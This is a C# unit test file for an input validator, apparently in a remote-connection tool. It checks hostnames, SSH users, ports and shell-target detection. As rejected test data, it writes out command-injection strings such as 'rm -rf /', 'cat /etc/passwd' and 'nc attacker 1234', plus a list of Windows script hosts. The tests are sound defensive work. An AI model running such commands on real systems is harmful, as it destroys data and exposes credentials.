/*
 * Copyright 2026 Julien Bombled
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

using System.Text.RegularExpressions;
using Heimdall.Core.Security;

namespace Heimdall.Core.Tests;

public class InputValidatorTests
{
    // ── Hostname validation ─────────────────────────────────────────────

    [Theory]
    [InlineData("server.example.com", true)]
    [InlineData("my-host", true)]
    [InlineData("host123", true)]
    [InlineData("a.b.c.d.e", true)]
    [InlineData("-invalid", false)]
    [InlineData("invalid-", false)]
    [InlineData("host..double", false)]
    [InlineData("", false)]
    [InlineData(null, false)]
    [InlineData("host;rm -rf /", false)]
    [InlineData("host$(whoami)", false)]
    public void Validate_Hostname_ReturnsExpected(string? value, bool expected)
    {
        Assert.Equal(expected, InputValidator.Validate(value, "Hostname"));
    }

    // ── SshUser validation (CWE-78) ────────────────────────────────────

    [Theory]
    [InlineData("admin", true)]
    [InlineData("deploy_user", true)]
    [InlineData("user.name", true)]
    [InlineData("user@domain", true)]
    [InlineData(@"DOMAIN\user", true)]
    [InlineData("user-name", true)]
    [InlineData("", false)]
    [InlineData(null, false)]
    [InlineData("user;echo pwned", false)]
    [InlineData("user$(id)", false)]
    [InlineData("user`whoami`", false)]
    [InlineData("user | cat /etc/passwd", false)]
    public void Validate_SshUser_RejectsInjection(string? value, bool expected)
    {
        Assert.Equal(expected, InputValidator.Validate(value, "SshUser"));
    }

    // ── Username validation (RDP) ───────────────────────────────────────

    [Theory]
    [InlineData("admin", true)]
    [InlineData(@"DOMAIN\user", true)]
    [InlineData("user@domain.com", true)]
    [InlineData("user-name_01", true)]
    [InlineData("user name", false)]
    [InlineData("", false)]
    public void Validate_Username_ReturnsExpected(string? value, bool expected)
    {
        Assert.Equal(expected, InputValidator.Validate(value, "Username"));
    }

    // ── IPv4 validation ─────────────────────────────────────────────────

    [Theory]
    [InlineData("192.168.1.1", true)]
    [InlineData("10.0.0.1", true)]
    [InlineData("255.255.255.255", true)]
    [InlineData("0.0.0.0", true)]
    [InlineData("256.0.0.1", false)]
    [InlineData("192.168.1", false)]
    [InlineData("not-an-ip", false)]
    public void Validate_IPv4_ReturnsExpected(string? value, bool expected)
    {
        Assert.Equal(expected, InputValidator.Validate(value, "IPv4"));
    }

    // ── Port validation ─────────────────────────────────────────────────

    [Theory]
    [InlineData("22", true)]
    [InlineData("3389", true)]
    [InlineData("65535", true)]
    [InlineData("1", true)]
    [InlineData("0", true)]
    [InlineData("99999", true)]
    [InlineData("123456", false)]
    [InlineData("-1", false)]
    [InlineData("abc", false)]
    public void Validate_Port_RegexCheck(string? value, bool expected)
    {
        Assert.Equal(expected, InputValidator.Validate(value, "Port"));
    }

    [Theory]
    [InlineData(1, true)]
    [InlineData(22, true)]
    [InlineData(65535, true)]
    [InlineData(0, false)]
    [InlineData(-1, false)]
    [InlineData(65536, false)]
    public void ValidatePortRange_ReturnsExpected(int port, bool expected)
    {
        Assert.Equal(expected, InputValidator.ValidatePortRange(port));
    }

    // ── TunnelTarget validation ─────────────────────────────────────────

    [Theory]
    [InlineData("localhost:3389", true)]
    [InlineData("10.0.0.1:22", true)]
    [InlineData("server.local:8080", true)]
    [InlineData("host-only", false)]
    [InlineData(":3389", false)]
    [InlineData("host:", false)]
    public void Validate_TunnelTarget_ReturnsExpected(string? value, bool expected)
    {
        Assert.Equal(expected, InputValidator.Validate(value, "TunnelTarget"));
    }

    // ── SshGateway DNS validation ───────────────────────────────────────

    [Theory]
    [InlineData("gateway.example.com", true)]
    [InlineData("gw-01.corp.local", true)]
    [InlineData("bastion", true)]
    [InlineData("host..invalid", false)]
    [InlineData("host.-invalid", false)]
    [InlineData("-starts-hyphen", false)]
    public void Validate_SshGateway_EnforcesDnsRules(string? value, bool expected)
    {
        Assert.Equal(expected, InputValidator.Validate(value, "SshGateway"));
    }

    [Fact]
    public void Validate_Hostname_RejectsExcessiveFqdnLength()
    {
        // Build a hostname with total length > 255
        string longLabel = new('a', 63);
        string longHostname = string.Join(".", longLabel, longLabel, longLabel, longLabel, "com");
        // Should be >255 chars total
        Assert.True(longHostname.Length > 255);

        Assert.False(InputValidator.Validate(longHostname, "Hostname"));
    }

    [Fact]
    public void Validate_Hostname_RejectsLabelOver63Chars()
    {
        string longLabel = new('a', 64);
        string hostname = $"{longLabel}.example.com";

        Assert.False(InputValidator.Validate(hostname, "Hostname"));
    }

    // ── Engine policy: no wall-clock deadline decides validity ──────────

    [Fact]
    public void EveryPattern_RunsOnTheNonBacktrackingEngine()
    {
        // Asserted as a policy, not inferred from how fast a match runs. A timing oracle would
        // itself be scheduling-dependent, which is the defect this replaces.
        foreach (string name in InputValidator.GetPatternNames())
        {
            RegexOptions? options = InputValidator.GetPatternOptions(name);

            Assert.NotNull(options);
            Assert.True(
                options!.Value.HasFlag(RegexOptions.NonBacktracking),
                $"Pattern '{name}' is not on the non-backtracking engine: {options}.");

            // Compiled and NonBacktracking are accepted together by the runtime, and the compiled
            // backtracking engine is then bypassed. Allowing the flag would let the pattern claim
            // an engine it does not use, so it is refused outright.
            Assert.False(
                options.Value.HasFlag(RegexOptions.Compiled),
                $"Pattern '{name}' still carries RegexOptions.Compiled: {options}.");
        }
    }

    [Fact]
    public void NoPattern_CarriesAMatchDeadline()
    {
        // A deadline is decided by the scheduler, so any finite value can refuse a valid input on
        // a loaded machine. The non-backtracking engine is what bounds the match instead.
        foreach (string name in InputValidator.GetPatternNames())
        {
            TimeSpan? timeout = InputValidator.GetPatternMatchTimeout(name);

            Assert.NotNull(timeout);
            Assert.Equal(Regex.InfiniteMatchTimeout, timeout!.Value);
        }
    }

    [Fact]
    public void GetPatternOptions_UnknownPattern_ReturnsNull()
    {
        Assert.Null(InputValidator.GetPatternOptions("FakePattern"));
        Assert.Null(InputValidator.GetPatternMatchTimeout("FakePattern"));
    }

    [Theory]
    [InlineData("gateway.example.com")]
    [InlineData("host")]
    [InlineData("a.b.c.d.example.com")]
    [InlineData("192.168.1.1")]
    [InlineData("127.0.0.1")]
    public void Validate_ShortValidAddress_IsAccepted(string value)
    {
        // The exact value whose rejection started this: a short, ordinary hostname must be
        // accepted on its own merits, never refused because a deadline elapsed mid-match.
        Assert.True(InputValidator.Validate(value, "Address"));
    }

    [Theory]
    [InlineData("a;rm -rf /")]
    [InlineData("host name")]
    [InlineData("host$(whoami)")]
    [InlineData("host|nc attacker 1234")]
    [InlineData("host`id`")]
    [InlineData("host&&echo")]
    [InlineData("../../etc/passwd")]
    [InlineData("host\nsecond")]
    public void Validate_InjectionShapedAddress_IsStillRefused(string value)
    {
        // Fail-closed is preserved: these are refused by failing to match, not by timing out.
        Assert.False(InputValidator.Validate(value, "Address"));
    }

    [Fact]
    public void Validate_FqdnOverTheLimit_IsRefusedByTheBoundAloneNotByLabelRules()
    {
        // Every label is legal and no invalid sequence is present, so the total-length bound is
        // the only rule that can refuse this. Removing that bound makes this value pass.
        string label = new('a', 60);
        string oversized = string.Join('.', label, label, label, label, label);

        Assert.True(oversized.Length > 255, "the fixture must exceed the FQDN limit");
        Assert.All(oversized.Split('.'), part => Assert.True(part.Length <= 63));
        Assert.DoesNotContain("..", oversized, StringComparison.Ordinal);

        Assert.False(InputValidator.Validate(oversized, "Address"));
        Assert.False(InputValidator.Validate(oversized, "Hostname"));
        Assert.False(InputValidator.Validate(oversized, "SshGateway"));
    }

    [Fact]
    public void Validate_FqdnAtTheLimit_IsStillAccepted()
    {
        // The bound must refuse what exceeds it and nothing else: a name exactly at the limit is
        // legal, so a mutant tightening the comparison to >= is caught here.
        string label = new('a', 63);
        string atLimit = string.Join('.', label, label, label, label);

        Assert.Equal(255, atLimit.Length);
        Assert.True(InputValidator.Validate(atLimit, "Hostname"));
    }

    // ── Unknown pattern ─────────────────────────────────────────────────

    [Fact]
    public void Validate_UnknownPattern_ReturnsFalse()
    {
        Assert.False(InputValidator.Validate("some-value", "NonExistentPattern"));
    }

    // ── GetPattern / GetPatternNames ────────────────────────────────────

    [Fact]
    public void GetPattern_KnownPattern_ReturnsNonNull()
    {
        Assert.NotNull(InputValidator.GetPattern("Hostname"));
    }

    [Fact]
    public void GetPattern_UnknownPattern_ReturnsNull()
    {
        Assert.Null(InputValidator.GetPattern("FakePattern"));
    }

    [Fact]
    public void GetPatternNames_ReturnsAllExpectedPatterns()
    {
        List<string> names = InputValidator.GetPatternNames().ToList();

        Assert.Contains("SshGateway", names);
        Assert.Contains("SshUser", names);
        Assert.Contains("Username", names);
        Assert.Contains("Hostname", names);
        Assert.Contains("IPv4", names);
        Assert.Contains("Address", names);
        Assert.Contains("Port", names);
        Assert.Contains("TunnelTarget", names);
    }

    // ── IsShellTarget ──────────────────────────────────────────────────

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void IsShellTarget_NullOrEmpty_ReturnsTrue(string? path)
    {
        Assert.True(InputValidator.IsShellTarget(path));
    }

    [Theory]
    [InlineData("cmd.exe")]
    [InlineData("CMD.EXE")]
    [InlineData("cmd")]
    [InlineData(@"C:\Windows\System32\cmd.exe")]
    public void IsShellTarget_CmdExe_ReturnsTrue(string path)
    {
        Assert.True(InputValidator.IsShellTarget(path));
    }

    [Theory]
    [InlineData("script.bat")]
    [InlineData("DEPLOY.BAT")]
    [InlineData(@"C:\scripts\run.cmd")]
    [InlineData("setup.CMD")]
    public void IsShellTarget_BatchFiles_ReturnsTrue(string path)
    {
        Assert.True(InputValidator.IsShellTarget(path));
    }

    [Theory]
    [InlineData("powershell.exe")]
    [InlineData("pwsh.exe")]
    [InlineData("powershell")]
    [InlineData("pwsh")]
    [InlineData(@"C:\Program Files\PowerShell\7\pwsh.exe")]
    public void IsShellTarget_PowerShell_ReturnsTrue(string path)
    {
        Assert.True(InputValidator.IsShellTarget(path));
    }

    [Theory]
    [InlineData("bash.exe")]
    [InlineData("bash")]
    [InlineData("sh.exe")]
    [InlineData("sh")]
    [InlineData("zsh.exe")]
    [InlineData("wsl.exe")]
    [InlineData("wsl")]
    [InlineData(@"C:\Windows\System32\wsl.exe")]
    public void IsShellTarget_UnixShellsAndWsl_ReturnsTrue(string path)
    {
        Assert.True(InputValidator.IsShellTarget(path));
    }

    [Theory]
    [InlineData("cscript.exe")]
    [InlineData("wscript.exe")]
    [InlineData("mshta.exe")]
    [InlineData("cscript")]
    [InlineData(@"C:\Windows\System32\cscript.exe")]
    public void IsShellTarget_WindowsScriptHosts_ReturnsTrue(string path)
    {
        Assert.True(InputValidator.IsShellTarget(path));
    }

    [Theory]
    [InlineData("script.ps1")]
    [InlineData("deploy.vbs")]
    [InlineData("build.js")]
    [InlineData("task.wsf")]
    [InlineData("app.hta")]
    [InlineData(@"C:\scripts\run.ps1")]
    [InlineData(@"C:\tools\panel.hta")]
    public void IsShellTarget_ScriptExtensions_ReturnsTrue(string path)
    {
        Assert.True(InputValidator.IsShellTarget(path));
    }

    [Theory]
    [InlineData("macro.jse")]
    [InlineData("MACRO.JSE")]
    [InlineData("payload.vbe")]
    [InlineData(@"C:\x\y.jse")]
    public void IsShellTarget_EncodedScriptHosts_ReturnsTrue(string path)
    {
        Assert.True(InputValidator.IsShellTarget(path));
    }

    [Theory]
    [InlineData("cmd.exe ")]
    [InlineData("cmd.exe.")]
    [InlineData("script.bat ")]
    [InlineData("deploy.ps1.")]
    public void IsShellTarget_TrailingSpaceOrDot_StillDetectsShell(string path)
    {
        Assert.True(InputValidator.IsShellTarget(path));
    }

    [Theory]
    [InlineData("ping.exe ")]
    [InlineData("putty.exe.")]
    public void IsShellTarget_TrailingSpaceOnRegularExe_StillFalse(string path)
    {
        Assert.False(InputValidator.IsShellTarget(path));
    }

    [Theory]
    [InlineData("putty.exe")]
    [InlineData("winscp.exe")]
    [InlineData("keepassxc-cli.exe")]
    [InlineData(@"C:\tools\ping.exe")]
    [InlineData("nslookup.exe")]
    [InlineData("tracert.exe")]
    [InlineData("bw.exe")]
    [InlineData("op.exe")]
    public void IsShellTarget_RegularExe_ReturnsFalse(string path)
    {
        Assert.False(InputValidator.IsShellTarget(path));
    }

    // ------------------------------------------------------------------
    // The domain check approves a trimmed, wildcard-stripped form. What it approved is now
    // obtainable, so a caller that keeps the value can keep the one that passed.
    // ------------------------------------------------------------------

    [Theory]
    [InlineData("host.example.com", "host.example.com")]
    [InlineData("  host.example.com  ", "host.example.com")]
    [InlineData("*.example.com", "example.com")]
    [InlineData("*.sub.example.com", "sub.example.com")]
    [InlineData(".example.com", "example.com")]
    [InlineData("10.0.0.5", "10.0.0.5")]
    public void TryCanonicalizeDomain_ReturnsTheFormThatWasApproved(string value, string expected)
    {
        Assert.True(InputValidator.TryCanonicalizeDomain(value, out string canonical));
        Assert.Equal(expected, canonical);
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("*")]
    [InlineData("not a host")]
    [InlineData("host..example.com")]
    [InlineData("-leading.example.com")]
    public void TryCanonicalizeDomain_RefusesAndYieldsNothing(string? value)
    {
        Assert.False(InputValidator.TryCanonicalizeDomain(value, out string canonical));
        Assert.Equal(string.Empty, canonical);
    }

    [Theory]
    [InlineData("host.example.com")]
    [InlineData("  host.example.com  ")]
    [InlineData("*.example.com")]
    [InlineData("10.0.0.5")]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("not a host")]
    [InlineData("host..example.com")]
    [InlineData("*")]
    public void ValidateDomain_AnswersExactlyWhatCanonicalizationAnswers(string? value)
    {
        // The two must not be allowed to drift: the boolean is the wrapper's only job.
        Assert.Equal(
            InputValidator.TryCanonicalizeDomain(value, out _),
            InputValidator.ValidateDomain(value));
    }
}
